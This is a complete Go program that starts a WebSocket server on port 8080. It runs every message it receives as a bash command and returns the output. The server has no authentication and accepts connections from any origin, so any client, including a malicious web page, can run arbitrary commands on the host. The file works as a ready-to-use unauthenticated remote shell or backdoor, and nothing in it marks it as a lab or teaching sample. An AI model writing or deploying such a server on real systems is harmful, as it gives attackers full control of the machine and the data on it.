package main

import (
	"log"
	"net/http"
	"os/exec"

	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	ReadBufferSize:  1024,
	WriteBufferSize: 1024,
	CheckOrigin: func(r *http.Request) bool {
		return true
	},
}

func handleConnections(w http.ResponseWriter, r *http.Request) {
	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Fatal(err)
	}

	for {
		_, message, err := ws.ReadMessage()
		if err != nil {
			log.Println("read:", err)
			return
		}

		cmd := exec.Command("bash", "-c", string(message))
		output, err := cmd.Output()
		if err != nil {
			ws.WriteMessage(websocket.TextMessage, []byte(err.Error()+"\n"))
			continue
		}

		ws.WriteMessage(websocket.TextMessage, append(output, '\n'))
	}
}

func main() {
	http.HandleFunc("/ws", handleConnections)

	err := http.ListenAndServe(":8080", nil)
	if err != nil {
		log.Fatal("ListenAndServe: ", err)
	}
}
